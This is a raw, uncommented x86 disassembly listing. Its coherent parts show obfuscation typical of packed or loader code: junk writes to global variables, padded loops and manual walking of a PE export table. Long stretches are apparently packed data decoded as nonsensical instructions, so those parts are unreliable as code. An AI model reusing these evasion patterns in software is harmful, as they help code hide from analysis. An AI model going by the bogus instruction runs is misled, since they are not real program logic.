  40c3ef:	xor    DWORD PTR ds:0x4336c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433637,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43362b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43362f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433623,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4336e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4336f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4336a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4336eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4336eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4336eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4336eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4336eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4336eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4336eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4336eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4336eb
  40c4ce:	and    esi,DWORD PTR ds:0x4336ef
  40c4d4:	mov    DWORD PTR ds:0x4336eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4336bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433683,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43366f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4336fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4336eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4336f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x6ecf5658
  40c577:	mov    ds:0x7e811897,eax
  40c57c:	jle    0x40c5fb
  40c57e:	jge    0x40c5fe
  40c580:	jle    0x40c5a3
  40c582:	js     0x40c5a0
  40c584:	xchg   ebp,eax
  40c585:	icebp  
  40c586:	out    0x96,al
  40c588:	test   BYTE PTR [ebp-0x1e],0x96
  40c58c:	push   edx
  40c58d:	mov    esi,0x8db4c6bf
  40c592:	xor    ecx,DWORD PTR [ebx+0xc44be2b]
  40c598:	jmp    0x821ea46e
  40c59d:	imul   ebx,DWORD PTR [edi-0x15765eae],0x2d
  40c5a4:	bound  ebp,QWORD PTR [ecx]
  40c5a6:	jecxz  0x40c5a4
  40c5a8:	lods   al,BYTE PTR ds:[esi]
  40c5a9:	xchg   ebx,eax
  40c5aa:	repz cmp ebx,DWORD PTR [esi]
  40c5ad:	das    
  40c5ae:	or     eax,DWORD PTR [esi+0x25]
  40c5b1:	(bad)  
  40c5b2:	iret   
  40c5b3:	pop    ds
  40c5b4:	jp     0x40c611
  40c5b6:	jle    0x40c609
  40c5b8:	scas   al,BYTE PTR es:[edi]
  40c5b9:	in     al,dx
  40c5ba:	aas    
  40c5bb:	xor    DWORD PTR [edi+esi*8],ebp
  40c5be:	popf   
  40c5bf:	fmul   DWORD PTR [edx]
  40c5c1:	xchg   esp,eax
  40c5c2:	in     al,dx
  40c5c3:	pop    edx
  40c5c4:	jge    0x40c560
  40c5c6:	cmp    ecx,DWORD PTR [esi+0x4f56ce90]
  40c5cc:	int    0xb
  40c5ce:	scas   eax,DWORD PTR es:[edi]
  40c5cf:	rcl    DWORD PTR [esi+edx*4+0x1fd754ef],cl
  40c5d6:	test   edi,edx
  40c5d8:	repnz gs xchg ebp,eax
  40c5db:	add    DWORD PTR [edi+edi*2-0xe1ea6e9],esi
  40c5e2:	pop    ds
  40c5e3:	add    DWORD PTR [ebx+0x1b],esi
  40c5e6:	and    ecx,DWORD PTR [ebx-0x36]
  40c5e9:	and    BYTE PTR ds:0x116e22e1,cl
  40c5ef:	or     BYTE PTR [ebx],0xe3
  40c5f2:	sub    esp,esi
  40c5f4:	cmp    eax,0x91f30e4c
  40c5f9:	dec    esi
  40c5fa:	dec    esp
  40c5fb:	xchg   edi,eax
  40c5fc:	ret    
  40c5fd:	retf   
  40c5fe:	jg     0x40c5d6
  40c600:	mov    BYTE PTR [ebx-0x28912264],0x2
  40c607:	or     eax,0xadcbc113
  40c60c:	xor    al,BYTE PTR [edx-0x2e]
  40c60f:	cmp    ah,BYTE PTR [ecx-0x75]
  40c612:	int    0xde
  40c614:	add    bl,BYTE PTR [edi+0x74]
  40c617:	dec    ecx
  40c618:	mov    eax,0xa758bead
  40c61d:	push   ebx
  40c61e:	add    ch,BYTE PTR [ebx]
  40c620:	imul   ebp,DWORD PTR [eax+0x3],0x31
  40c624:	bound  edx,QWORD PTR [esi+0x32]
  40c627:	mov    bl,0x1a
  40c629:	pop    ecx
  40c62a:	mov    dl,0x34
  40c62c:	push   0xfffffff3
  40c62e:	ins    DWORD PTR es:[edi],dx
  40c62f:	or     bh,BYTE PTR [ecx]
  40c631:	jbe    0x40c5d5
  40c633:	push   es
  40c634:	popf   
  40c635:	add    al,0xc6
  40c637:	ficom  DWORD PTR [edx+0x7e]
  40c63a:	jb     0x40c5e0
  40c63c:	cmp    DWORD PTR [eax-0x63],edx
  40c63f:	fist   DWORD PTR [esi-0x13]
  40c642:	xchg   bp,ax
  40c644:	stos   BYTE PTR es:[edi],al
  40c645:	dec    ebp
  40c646:	or     al,0x4d
  40c648:	retf   
  40c649:	lods   eax,DWORD PTR ds:[esi]
  40c64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c64b:	sub    edx,DWORD PTR [esi+ecx*1+0x108d76ff]
  40c652:	ins    DWORD PTR es:[edi],dx
  40c653:	aaa    
  40c654:	jno    0x40c6a4
  40c656:	sub    BYTE PTR [edi],dl
  40c658:	imul   ebp,DWORD PTR [ebx+0x73],0x33
  40c65c:	dec    ebx
  40c65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c65e:	xchg   ebx,esp
  40c660:	mov    sp,0x3140
  40c664:	icebp  
  40c665:	fwait
  40c666:	cmp    cl,BYTE PTR [ecx+0x46a9808e]
  40c66c:	stos   DWORD PTR es:[edi],eax
  40c66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66e:	rcl    BYTE PTR [ebx],cl
  40c670:	fcomp  DWORD PTR [edx+0x0]
  40c673:	jne    0x40c6db
  40c675:	pop    ebp
  40c676:	xchg   ebp,eax
  40c677:	clc    
  40c678:	pop    ebx
  40c679:	aad    0x4b
  40c67b:	or     ebx,DWORD PTR [esi-0x20]
  40c67e:	cmp    DWORD PTR [ecx],esp
  40c680:	not    DWORD PTR [edx-0x3a]
  40c683:	inc    ebx
  40c684:	ss sbb BYTE PTR es:[edi+0x44],0x1
  40c68a:	test   eax,0xef9f223e
  40c68f:	rcl    BYTE PTR [edx],1
  40c691:	das    
  40c692:	sar    DWORD PTR [ebp+0x6c],1
  40c695:	ret    
  40c696:	sbb    esi,DWORD PTR [edi+0x775bac69]
  40c69c:	inc    eax
  40c69d:	xor    eax,0x7e61475b
  40c6a2:	into   
  40c6a3:	xchg   BYTE PTR [ebp-0x30],al
  40c6a6:	aad    0x32
  40c6a8:	fisttp DWORD PTR [ebp-0x4]
  40c6ab:	inc    ebp
  40c6ac:	mov    ecx,0xc5edae84
  40c6b1:	cs bnd jnp 0x40c643
  40c6b5:	adc    BYTE PTR [edx-0x4d],bl
  40c6b8:	mov    ah,0xdd
  40c6ba:	sbb    edx,ebp
  40c6bc:	icebp  
  40c6bd:	xor    BYTE PTR [ecx+ebp*8-0x7b4028a5],cl
  40c6c4:	add    eax,edx
  40c6c6:	jle    0x40c711
  40c6c8:	popa   
  40c6c9:	mov    al,ds:0x7368316c
  40c6ce:	and    esp,DWORD PTR [edx+0x33]
  40c6d1:	ret    
  40c6d2:	aaa    
  40c6d3:	mov    bl,0x3
  40c6d5:	fld    QWORD PTR [eax-0x79]
  40c6d8:	mov    al,ds:0x5fa3345b
  40c6dd:	jne    0x40c73a
  40c6df:	mov    BYTE PTR [esi+0x8],dl
  40c6e2:	out    0x19,eax
  40c6e4:	pop    ds
  40c6e5:	push   ecx
  40c6e6:	int    0x79
  40c6e8:	call   0xb083:0x8c1bd18b
  40c6ef:	ins    BYTE PTR es:[edi],dx
  40c6f0:	cld    
  40c6f1:	add    al,0x60
  40c6f3:	jbe    0x40c6bc
  40c6f5:	int    0x14
  40c6f7:	pop    ss
  40c6f8:	pushf  
  40c6f9:	movups xmm3,XMMWORD PTR [esi+0x7912b541]
  40c700:	inc    ebp
  40c701:	fadd   DWORD PTR [eax+edi*2-0x58]
  40c705:	sbb    DWORD PTR es:[ecx-0x3c],edx
  40c709:	leave  
  40c70a:	bound  ecx,QWORD PTR [esp+eax*2]
  40c70d:	add    al,0x12
  40c70f:	cli    
  40c710:	push   ds
  40c711:	int    0xee
  40c713:	push   edx
  40c714:	push   edi
  40c715:	test   DWORD PTR [ecx],ecx
  40c717:	dec    esi
  40c718:	pop    esi
  40c719:	dec    eax
  40c71a:	cmp    al,0xa7
  40c71c:	cmp    al,0x16
  40c71e:	bnd call 0x2da7e0bd
  40c724:	xor    DWORD PTR [ebx+0x21357af6],0xffffffea
  40c72b:	rcr    BYTE PTR [ebx-0x741ad02],1
  40c731:	xor    eax,0x885c28d5
  40c736:	scas   al,BYTE PTR es:[edi]
  40c737:	je     0x40c716
  40c739:	push   edi
  40c73a:	in     al,0xdc
  40c73c:	push   ebp
  40c73d:	add    eax,0x8ebdea5b
  40c742:	jp     0x40c6f4
  40c744:	xchg   edi,eax
  40c745:	jecxz  0x40c6e6
  40c747:	lods   al,BYTE PTR ss:[esi]
  40c749:	push   es
  40c74a:	pop    esi
  40c74b:	inc    ecx
  40c74c:	out    0x77,eax
  40c74e:	and    al,0x1f
  40c750:	dec    ecx
  40c751:	aam    0xc3
  40c753:	outs   dx,DWORD PTR ds:[esi]
  40c754:	sbb    eax,ebx
  40c756:	add    al,0xfc
  40c758:	mov    ds:0x80bada96,eax
  40c75d:	push   ds
  40c75e:	push   0xffffff98
  40c760:	shl    DWORD PTR [ebp+0x68be6048],cl
  40c766:	jmp    0x40c78d
  40c768:	rcr    DWORD PTR [ecx-0xd],1
  40c76b:	dec    ebx
  40c76c:	push   ebp
  40c76d:	call   0xa66e:0x443b3805
  40c774:	add    eax,DWORD PTR [edx+0x0]
  40c777:	jmp    0xc315ee37
  40c77c:	add    dh,BYTE PTR [edx]
  40c77e:	(bad)  
  40c77f:	hlt    
  40c780:	test   dh,ch
  40c782:	lea    ecx,[ecx+ecx*1]
  40c785:	add    BYTE PTR [ebx+ebx*1-0x3c9f7d37],dl
  40c78c:	pop    eax
  40c78d:	in     eax,dx
  40c78e:	mov    esi,0x26172a00
  40c793:	jecxz  0x40c7e1
  40c795:	clc    
  40c796:	adc    eax,0xb6225f33
  40c79b:	call   0x205a:0x7da3d34
  40c7a2:	add    ah,BYTE PTR [esp+edi*4-0x7628d966]
  40c7a9:	xor    BYTE PTR [ecx+0x2f],ch
  40c7ac:	jecxz  0x40c768
  40c7ae:	cmp    al,BYTE PTR [ebx-0x1279f40e]
  40c7b4:	xchg   edi,eax
  40c7b5:	ret    0x8834
  40c7b8:	or     BYTE PTR [eax],ah
  40c7ba:	dec    esp
  40c7bb:	adc    al,0x70
  40c7bd:	mov    ?,WORD PTR [eax+0x56]
  40c7c0:	int3   
  40c7c1:	hlt    
  40c7c2:	aam    0xba
  40c7c4:	push   esp
  40c7c5:	dec    ecx
  40c7c6:	and    eax,0xc30ff7eb
  40c7cb:	aaa    
  40c7cc:	dec    esi
  40c7cd:	add    al,0x28
  40c7cf:	push   edi
  40c7d0:	pop    ebx
  40c7d1:	inc    edx
  40c7d2:	ins    DWORD PTR es:[edi],dx
  40c7d3:	rol    edx,cl
  40c7d5:	or     dl,cl
  40c7d7:	dec    ecx
  40c7d8:	pop    eax
  40c7d9:	adc    edi,DWORD PTR [edi+0x6f]
  40c7dc:	dec    esp
  40c7dd:	dec    esi
  40c7de:	mov    ds:0xc5793311,eax
  40c7e3:	mov    cs,WORD PTR [ebp-0x161186b1]
  40c7e9:	(bad)
  40c7ec:	jl     0x40c7f8
  40c7ee:	in     eax,0x6a
  40c7f0:	mov    bh,0x3a
  40c7f2:	fild   QWORD PTR [edx+0x3e5c5184]
  40c7f8:	pushf  
  40c7f9:	dec    edx
  40c7fa:	mov    BYTE PTR [edi+0x4ea89858],dh
  40c800:	inc    edi
  40c801:	ss xor al,0x67
  40c804:	xchg   BYTE PTR [ebx-0x7de254d],dh
  40c80a:	fcmove st,st(7)
  40c80c:	jne    0x40c80f
  40c80e:	jbe    0x40c86c
  40c810:	ror    BYTE PTR [edi-0x7a2d108b],0xf7
  40c817:	cmp    edx,0xc98a4d49
  40c81d:	xchg   edi,eax
  40c81e:	or     esp,esp
  40c820:	pushf  
  40c821:	(bad)  
  40c822:	aam    0xfb
  40c824:	shl    BYTE PTR [edx],1
  40c826:	enter  0x6f33,0xe3
  40c82a:	dec    edi
  40c82b:	retf   
  40c82c:	rol    ebx,1
  40c82e:	test   esi,edi
  40c830:	mov    dl,0xee
  40c832:	(bad)  
  40c833:	(bad)  
  40c835:	out    dx,eax
  40c836:	adc    BYTE PTR [esi],0x45
  40c839:	jg     0x40c88a
  40c83b:	xlat   BYTE PTR ds:[ebx]
  40c83c:	cmp    al,0xe6
  40c83e:	push   cs
  40c83f:	outs   dx,BYTE PTR ds:[esi]
  40c840:	ret    0x10b7
  40c843:	cdq    
  40c844:	add    DWORD PTR [esi+edx*4+0x5a],0xffffffcf
  40c849:	mov    ebp,0x1519406d
  40c84e:	lea    esi,[esp+esi*4]
  40c851:	das    
  40c852:	js     0x40c7f9
  40c854:	mov    al,ds:0x9ece2154
  40c859:	in     al,0x39
  40c85b:	mov    dl,0x38
  40c85d:	mov    bl,0x7d
  40c85f:	cs popf 
  40c861:	adc    al,0x52
  40c863:	hlt    
  40c864:	stos   BYTE PTR es:[edi],al
  40c865:	loope  0x40c819
  40c867:	or     BYTE PTR [esi],dl
  40c869:	sbb    cl,bl
  40c86b:	mov    BYTE PTR [esi+0x17b68ea4],ah
  40c871:	mov    al,BYTE PTR [edx]
  40c873:	mov    esi,0x882a62b
  40c878:	and    DWORD PTR [eax+0x1954cc8d],esp
  40c87e:	sub    al,0xae
  40c880:	add    al,BYTE PTR [ebx+0x4e]
  40c883:	pop    esp
  40c884:	mov    eax,DWORD PTR [ebp-0x14]
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	mov    ecx,0x273ff378
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	ins    DWORD PTR es:[edi],dx
  40c8bf:	mov    eax,0x73b38f9d
  40c8c4:	test   DWORD PTR [edx+esi*2+0x16254abe],ecx
  40c8cb:	retf   0x134e
  40c8ce:	xchg   BYTE PTR [edi],dh
  40c8d0:	add    esi,ebp
  40c8d2:	add    al,BYTE PTR [edi+0xc]
  40c8d5:	mov    cl,0x7e
  40c8d7:	push   ebx
  40c8d8:	jb     0x40c8b8
  40c8da:	mov    ds:0xc5c0e2df,eax
  40c8df:	fwait
  40c8e0:	rcr    esp,cl
  40c8e2:	mov    dl,0x95
  40c8e4:	push   eax
  40c8e5:	jne    0x40c86b
  40c8e7:	scas   al,BYTE PTR es:[edi]
  40c8e8:	xor    cl,ah
  40c8ea:	sahf   
  40c8eb:	and    bh,BYTE PTR [edx]
  40c8ed:	add    esp,eax
  40c8ef:	shl    BYTE PTR [ebx-0x40],0x90
  40c8f3:	cmp    ebx,DWORD PTR [ecx-0x24beb082]
  40c8f9:	jne    0x40c904
  40c8fb:	xor    eax,0x33872324
  40c900:	inc    ecx
  40c901:	cmp    DWORD PTR [ebx+ebx*1-0x21ec6edd],edi
  40c908:	rcr    dl,1
  40c90a:	aas    
  40c90b:	in     eax,0x4
  40c90d:	inc    ebx
  40c90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90f:	inc    eax
  40c910:	pop    edi
  40c911:	iret   
  40c912:	in     eax,0xd9
  40c914:	push   ebp
  40c915:	shr    BYTE PTR [eax+0x205c110f],1
  40c91b:	xchg   edx,eax
  40c91c:	fimul  DWORD PTR fs:[edx]
  40c91f:	inc    edi
  40c920:	aam    0xd0
  40c922:	xchg   ecx,eax
  40c923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c924:	push   eax
  40c925:	xor    bh,dl
  40c927:	adc    BYTE PTR [edi+edx*4-0x50],0x51
  40c92c:	pop    edx
  40c92d:	sub    DWORD PTR [edx+ebp*4-0x48bb4054],0xffffffce
  40c935:	or     dl,BYTE PTR [ecx]
  40c937:	test   BYTE PTR [eax+ebx*1+0x6b],ch
  40c93b:	ret    
  40c93c:	outs   dx,BYTE PTR ds:[esi]
  40c93d:	retf   0xf4b1
  40c940:	add    eax,0x41521584
  40c945:	je     0x40c8f9
  40c947:	xor    esp,DWORD PTR [ebp-0x6d]
  40c94a:	mov    DWORD PTR [ebx+0x5995f652],ebp
  40c950:	fistp  QWORD PTR [eax-0x5224c993]
  40c956:	sti    
  40c957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c958:	retf   0xf240
  40c95b:	loop   0x40c9a0
  40c95d:	mov    al,0xca
  40c95f:	push   0xffffffd9
  40c961:	jle    0x40c8e8
  40c963:	xor    eax,0x87d566c2
  40c968:	xchg   esi,eax
  40c969:	xor    BYTE PTR [eax+0x76642b0f],dh
  40c96f:	and    dh,BYTE PTR [esi-0x29c50f02]
  40c975:	mov    al,ds:0xb0c8c2bd
  40c97a:	ins    DWORD PTR es:[edi],dx
  40c97b:	es jbe 0x40c9b7
  40c97e:	(bad)  
  40c97f:	xchg   edi,eax
  40c980:	sar    esi,cl
  40c982:	(bad)  
  40c983:	cwde   
  40c984:	inc    ebp
  40c985:	(bad)  
  40c986:	call   0xdb2d67cd
  40c98b:	push   ss
  40c98c:	scas   eax,DWORD PTR es:[edi]
  40c98d:	sbb    BYTE PTR [ecx-0x7c8c4680],ch
  40c993:	xchg   edx,ebp
  40c995:	les    eax,FWORD PTR [esi+edx*8+0x36bd6930]
  40c99c:	stos   BYTE PTR es:[edi],al
  40c99d:	dec    esp
  40c99e:	repnz nop
  40c9a0:	dec    ebx
  40c9a1:	(bad)  
  40c9a2:	addr16 into 
  40c9a4:	out    0x3c,al
  40c9a6:	mov    cl,0xc5
  40c9a8:	jle    0x40c9e9
  40c9aa:	aad    0x1b
  40c9ac:	adc    bh,BYTE PTR [eax+0xe]
  40c9af:	jl     0xabaf58e0
  40c9b5:	js     0x40c97b
  40c9b7:	repz mov al,0x71
  40c9ba:	inc    ecx
  40c9bb:	mov    ebp,0xd1e17b71
  40c9c0:	mov    bl,0xf8
  40c9c2:	mov    BYTE PTR [esi],0xb8
  40c9c5:	inc    ebx
  40c9c6:	loop   0x40ca3d
  40c9c8:	xchg   edx,eax
  40c9c9:	mov    esi,0x2dbef862
  40c9ce:	adc    ch,bl
  40c9d0:	mov    esi,DWORD PTR [ebp+esi*4-0x558d0930]
  40c9d7:	sbb    dl,dl
  40c9d9:	lock aaa 
  40c9db:	pop    es
  40c9dc:	push   ecx
  40c9dd:	jnp    0x40c9b8
  40c9df:	fld    st(2)
  40c9e1:	cmc    
  40c9e2:	xor    BYTE PTR [ecx+0x52],cl
  40c9e5:	adc    al,0x42
  40c9e7:	cmc    
  40c9e8:	shr    DWORD PTR [ecx-0x31380a07],1
  40c9ee:	push   cs
  40c9ef:	add    ch,BYTE PTR [edx]
  40c9f1:	fidivr WORD PTR [ebx-0x55]
  40c9f4:	push   edi
  40c9f5:	jge    0x40c9ed
  40c9f7:	(bad)  
  40c9f8:	fidivr DWORD PTR [edx-0x25]
  40c9fb:	pop    edi
  40c9fc:	and    al,0xb8
  40c9fe:	in     eax,0xbd
  40ca00:	je     0x40ca65
  40ca02:	pushf  
  40ca03:	std    
  40ca04:	clc    
  40ca05:	mov    esi,0xc44f065e
  40ca0a:	sub    al,BYTE PTR [eax]
  40ca0c:	jb     0x40c9ad
  40ca0e:	shl    ecx,0x50
  40ca11:	test   ah,ah
  40ca13:	push   0x18
  40ca15:	pop    eax
  40ca16:	imul   ebp,DWORD PTR [edx+ebp*8],0xffffff81
  40ca1a:	sub    DWORD PTR [eax+0x4f3bf949],0xffffff93
  40ca21:	test   eax,0xcfb58672
  40ca26:	or     esp,ebx
  40ca28:	dec    edi
  40ca29:	mov    BYTE PTR [edx+0x47],ch
  40ca2c:	fcompp 
  40ca2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca2f:	adc    al,0x21
  40ca31:	xchg   ecx,eax
  40ca32:	add    DWORD PTR [ebp-0x3d],0x864d36f8
  40ca39:	ror    esp,0x54
  40ca3c:	and    esp,DWORD PTR [eax]
  40ca3e:	xchg   esp,eax
  40ca3f:	test   eax,0xb1036f75
  40ca44:	fmul   st,st(7)
  40ca46:	dec    ecx
  40ca47:	xor    eax,0x1d60ca80
  40ca4c:	add    BYTE PTR [ebx],al
  40ca4e:	loop   0x40ca70
  40ca50:	inc    ebp
  40ca51:	xchg   ebx,eax
  40ca52:	div    BYTE PTR [ebx+0x1183ef99]
  40ca58:	cli    
  40ca59:	into   
  40ca5a:	pop    eax
  40ca5b:	nop
  40ca5c:	mul    esi
  40ca5e:	xor    bh,BYTE PTR [esi-0x1e]
  40ca61:	je     0x40ca06
  40ca63:	cli    
  40ca64:	sub    esi,esp
  40ca66:	maxps  xmm3,xmm2
  40ca69:	xlat   BYTE PTR ds:[ebx]
  40ca6a:	pop    esp
  40ca6b:	xor    ch,dh
  40ca6d:	popa   
  40ca6e:	icebp  
  40ca6f:	repz jae 0x40cad0
  40ca72:	xchg   BYTE PTR [edi-0x76],bh
  40ca75:	cmp    BYTE PTR [ebx+ecx*2-0x13],al
  40ca79:	pop    esi
  40ca7a:	jb     0x40cac1
  40ca7c:	das    
  40ca7d:	cmp    esp,DWORD PTR [esp+edx*4]
  40ca80:	sbb    eax,0xbd545e15
  40ca85:	test   BYTE PTR [ebp-0x24],bl
  40ca88:	aad    0x2a
  40ca8a:	mov    es,esp
  40ca8c:	dec    esi
  40ca8d:	outs   dx,DWORD PTR ds:[esi]
  40ca8e:	xchg   edi,eax
  40ca8f:	mov    ch,0xd1
  40ca91:	aad    0x43
  40ca93:	test   DWORD PTR [edi],edx
  40ca95:	enter  0x4db1,0x51
  40ca99:	leave  
  40ca9a:	mov    bl,0x53
  40ca9c:	sub    eax,0xac0845c4
  40caa1:	mov    eax,esp
  40caa3:	inc    ebx
  40caa4:	jne    0x40caf5
  40caa6:	push   es
  40caa7:	mov    bh,0x98
  40caa9:	rcr    ch,cl
  40caab:	out    dx,al
  40caac:	sbb    al,0xc6
  40caae:	xchg   edx,eax
  40caaf:	std    
  40cab0:	fwait
  40cab1:	mov    al,ds:0x522f4823
  40cab6:	xchg   DWORD PTR [edi+0x66622ed1],edx
  40cabc:	out    dx,eax
  40cabd:	(bad)  
  40cabe:	xlat   BYTE PTR ds:[ebx]
  40cabf:	int3   
  40cac0:	arpl   WORD PTR [ecx+0x222e1b2c],bp
  40cac6:	cmp    BYTE PTR ds:0xd61342fd,ah
  40cacc:	ror    DWORD PTR ds:0x64364df5,0x2f
  40cad3:	lods   al,BYTE PTR ds:[esi]
  40cad4:	xchg   esi,eax
  40cad5:	sbb    BYTE PTR [ebp+0x2b],bh
  40cad8:	das    
  40cad9:	sub    BYTE PTR [esi],0xe3
  40cadc:	xchg   ecx,eax
  40cadd:	jmp    0x6c94:0x6baf431f
  40cae4:	(bad)  
  40cae5:	sahf   
  40cae6:	popf   
  40cae7:	xchg   ebx,eax
  40cae8:	mov    eax,DWORD PTR [ebp+0x74]
  40caeb:	cmp    ebp,esi
  40caed:	shl    BYTE PTR [esi+0x28739bb3],0xb1
  40caf4:	and    al,0x6f
  40caf6:	pop    ebp
  40caf7:	jmp    0xac0b:0x7ff22713
  40cafe:	in     eax,0xe5
  40cb00:	outs   dx,DWORD PTR ds:[esi]
  40cb01:	dec    ebx
  40cb02:	add    DWORD PTR [edi+0x34349fd6],0x6017a051
  40cb0c:	cmp    al,0x84
  40cb0e:	xchg   DWORD PTR [edx+0x58e505aa],ecx
  40cb14:	xor    eax,0x4cdf534e
  40cb19:	(bad)  
  40cb1a:	int    0xc4
  40cb1c:	lods   al,BYTE PTR ds:[si]
  40cb1e:	cld    
  40cb1f:	sbb    eax,0xf7d65547
  40cb24:	stc    
  40cb25:	scas   al,BYTE PTR es:[edi]
  40cb26:	fwait
  40cb27:	xor    DWORD PTR [ebx+0x2221d9d0],0xffffffd0
  40cb2e:	fnstcw WORD PTR [ebx-0x50719f07]
  40cb34:	rcl    BYTE PTR [ebp+0x483ba49a],0xeb
  40cb3b:	into   
  40cb3c:	(bad)  
  40cb3d:	out    dx,eax
  40cb3e:	adc    bh,ah
  40cb40:	int3   
  40cb41:	pop    eax
  40cb42:	push   ebp
  40cb43:	cs rol edi,1
  40cb46:	fisub  WORD PTR [edi+0x1dfd1070]
  40cb4c:	jbe    0x40cb29
  40cb4e:	nop
  40cb4f:	push   0x40730c1
  40cb54:	mul    BYTE PTR [ebx+esi*1+0x1e4e913c]
  40cb5b:	push   edi
  40cb5c:	pop    edx
  40cb5d:	xchg   esi,eax
  40cb5e:	add    eax,0xf0b95db2
  40cb63:	cmp    bh,BYTE PTR [ecx-0x9]
  40cb66:	not    DWORD PTR [ecx-0x59]
  40cb69:	add    bl,BYTE PTR [eax]
  40cb6b:	lock pop esp
  40cb6d:	adc    dl,BYTE PTR [ebp+0x20d8e990]
  40cb73:	gs pushf 
  40cb75:	mov    dl,0x88
  40cb77:	jbe    0x40cb11
  40cb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb7a:	ins    DWORD PTR es:[edi],dx
  40cb7b:	dec    ecx
  40cb7c:	bound  eax,QWORD PTR ds:0xc95d001a
  40cb82:	xor    eax,DWORD PTR [edi+0x5f5c4ee]
  40cb88:	(bad)  
  40cb89:	cld    
  40cb8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb8b:	dec    ebx
  40cb8c:	add    BYTE PTR [edx-0x38],al
  40cb8f:	pop    ecx
  40cb90:	pop    edx
  40cb91:	ins    DWORD PTR es:[edi],dx
  40cb92:	je     0x40cb30
  40cb94:	xor    DWORD PTR [ebp+0x12],ebx
  40cb97:	(bad)  
  40cb98:	fcomp  QWORD PTR [ebx-0x33]
  40cb9b:	xchg   edx,eax
  40cb9c:	mov    eax,0xe458f25a
  40cba1:	or     ebp,DWORD PTR [edi+0x9]
  40cba4:	inc    edx
  40cba5:	popf   
  40cba6:	scas   al,BYTE PTR es:[edi]
  40cba7:	jl     0x40cb78
  40cba9:	jno    0x40cbd2
